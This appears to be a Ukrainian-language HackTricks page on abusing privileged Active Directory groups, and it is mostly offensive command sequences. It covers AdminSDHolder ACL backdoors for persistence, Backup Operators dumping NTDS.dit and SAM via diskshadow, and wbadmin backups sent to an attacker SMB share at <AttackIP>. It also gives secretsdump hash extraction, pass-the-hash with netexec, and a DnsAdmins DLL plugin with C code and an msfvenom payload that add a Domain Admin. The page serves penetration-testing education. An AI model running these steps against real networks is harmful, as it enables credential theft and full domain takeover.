# Привілейовані групи

{{#include ../../banners/hacktricks-training.md}}

## Відомі групи з адміністративними привілеями

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ця група уповноважена створювати облікові записи та групи, які в домені не мають прав адміністратора. Також вона дозволяє локальний вхід на Domain Controller (DC).

Щоб визначити учасників цієї групи, виконується наступна команда:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Дозволено додавати нових користувачів, а також локальний вхід на DC.

## AdminSDHolder група

Список контролю доступу (ACL) групи **AdminSDHolder** має вирішальне значення, оскільки він встановлює дозволи для всіх "protected groups" у Active Directory, включно з групами з високими привілеями. Цей механізм забезпечує захист цих груп, запобігаючи несанкціонованим змінам.

Зловмисник може скористатися цим, змінивши ACL групи **AdminSDHolder**, надавши звичайному користувачу повні права. Це фактично дасть цьому користувачу повний контроль над усіма protected groups. Якщо права цього користувача будуть змінені або видалені, вони будуть автоматично відновлені протягом години через конструкцію системи.

Команди для перегляду членів і зміни дозволів включають:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Для прискорення процесу відновлення доступний скрипт: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Детальніше див. на [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Кошик Active Directory

Членство в цій групі дозволяє читати видалені об'єкти Active Directory, що може розкрити конфіденційну інформацію:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Доступ до контролера домену (DC)

Доступ до файлів на DC обмежений, якщо користувач не належить до групи `Server Operators`, яка змінює рівень доступу.

### Підвищення привілеїв

За допомогою `PsService` або `sc` із Sysinternals можна переглядати та змінювати дозволи сервісів. Наприклад, група `Server Operators` має повний контроль над певними сервісами, що дозволяє виконувати довільні команди та підвищувати привілеї:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ця команда показує, що `Server Operators` мають повний доступ, що дозволяє маніпулювати службами для підвищення привілеїв.

## Backup Operators

Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` через привілеї `SeBackup` і `SeRestore`. Ці привілеї дозволяють обходити папки, переглядати вміст та копіювати файли, навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього потрібні спеціальні скрипти.

Щоб перерахувати членів групи, виконайте:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Локальна атака

Щоб використати ці привілеї локально, виконуються наступні кроки:

1. Імпортувати необхідні бібліотеки:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Увімкніть та перевірте `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Доступ та копіювання файлів із обмежених каталогів, наприклад:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Атака на AD

Прямий доступ до файлової системи контролера домену дозволяє викрасти базу даних `NTDS.dit`, яка містить всі NTLM-хеші доменних користувачів та комп'ютерів.

#### Використання diskshadow.exe

1. Створіть теневу копію диска `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Скопіюйте `NTDS.dit` з тіньової копії:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Як альтернативу, використовуйте `robocopy` для копіювання файлів:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Витягніть `SYSTEM` і `SAM` для отримання хешів:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Отримати всі хеші з `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Після вилучення: Pass-the-Hash до DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Використання wbadmin.exe

1. Налаштуйте NTFS-файлову систему для SMB‑сервера на машині атакуючого і збережіть SMB‑облікові дані на цільовій машині.
2. Використайте `wbadmin.exe` для резервного копіювання системи та вилучення `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Члени групи **DnsAdmins** можуть зловживати своїми привілеями, щоб завантажити довільну DLL з привілеями SYSTEM на DNS‑сервер, який часто розміщується на контролерах домену. Це дає значний потенціал для експлуатації.

Щоб перелічити учасників групи DnsAdmins, використайте:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Ця вразливість дозволяє виконувати довільний код з привілеями SYSTEM у службі DNS (зазвичай всередині DCs). Цю проблему виправили в 2021 році.

Члени можуть змусити DNS-сервер завантажити довільну DLL (локально або з віддаленого спільного ресурсу), використовуючи команди такі як:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Для завантаження DLL необхідно перезапустити службу DNS (що може вимагати додаткових прав):
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Для детальнішої інформації про цей вектор атаки зверніться до ired.team.

#### Mimilib.dll

Також можливо використати mimilib.dll для виконання команд, модифікуючи його для запуску конкретних команд або reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) для додаткової інформації.

### WPAD Record for MitM

DnsAdmins можуть маніпулювати DNS-записами для виконання Man-in-the-Middle (MitM) атак, створюючи WPAD запис після вимкнення global query block list. Інструменти, такі як Responder або Inveigh, можуть бути використані для spoofing та перехоплення мережевого трафіку.

### Event Log Readers
Члени можуть отримувати доступ до журналів подій, потенційно знаходячи чутливу інформацію, таку як plaintext passwords або деталі виконання команд:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Права Exchange Windows

Ця група може змінювати DACLs на об'єкті домену, що потенційно може надати привілеї DCSync. Техніки ескалації привілеїв, що експлуатують цю групу, детально описані в Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators мають повний доступ до Hyper-V, який можна використати для отримання контролю над віртуалізованими Domain Controllers. Це включає клонування живих DC та вилучення NTLM хешів із файлу NTDS.dit.

### Приклад експлуатації

Firefox's Mozilla Maintenance Service може бути використано Hyper-V Administrators для запуску команд від імені SYSTEM. Це передбачає створення жорсткого посилання на захищений файл SYSTEM і заміну його шкідливим виконуваним файлом:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Hard link exploitation has been mitigated in recent Windows updates.

## Group Policy Creators Owners

Ця група дозволяє її учасникам створювати Group Policies у домені. Однак її учасники не можуть застосовувати group policies до користувачів чи груп або редагувати існуючі GPOs.

## Organization Management

У середовищах, де розгорнуто **Microsoft Exchange**, спеціальна група, відома як **Organization Management**, має значні можливості. Ця група має привілеї для **доступу до поштових скриньок всіх користувачів домену** і зберігає **повний контроль над 'Microsoft Exchange Security Groups'** Organizational Unit (OU). Цей контроль включає групу **`Exchange Windows Permissions`**, яку можна використати для ескалації привілеїв.

### Privilege Exploitation and Commands

#### Print Operators

Члени групи **Print Operators** мають кілька привілеїв, включно з **`SeLoadDriverPrivilege`**, який дозволяє їм **log on locally to a Domain Controller**, вимкнути його та керувати принтерами. Щоб експлуатувати ці привілеї, особливо якщо **`SeLoadDriverPrivilege`** не видно в неелевованому контексті, необхідно обійти User Account Control (UAC).

To list the members of this group, the following PowerShell command is used:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Для більш детальних технік експлуатації, пов'язаних із **`SeLoadDriverPrivilege`**, слід звернутися до спеціалізованих ресурсів з безпеки.

#### Користувачі віддаленого робочого столу

Членам цієї групи надається доступ до ПК через Remote Desktop Protocol (RDP). Для переліку цих членів доступні PowerShell-команди:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Додаткові відомості про експлуатацію RDP можна знайти в спеціалізованих pentesting ресурсах.

#### Користувачі віддаленого управління

Члени можуть отримувати доступ до ПК через **Windows Remote Management (WinRM)**. Перевірка наявних членів здійснюється за допомогою:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Для технік експлуатації, пов'язаних із **WinRM**, слід ознайомитися зі спеціальною документацією.

#### Оператори серверів

Ця група має дозволи на виконання різних налаштувань на контролерах домену, зокрема права резервного копіювання та відновлення, зміну системного часу та вимкнення системи. Щоб перерахувати членів групи, використовується така команда:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Посилання <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
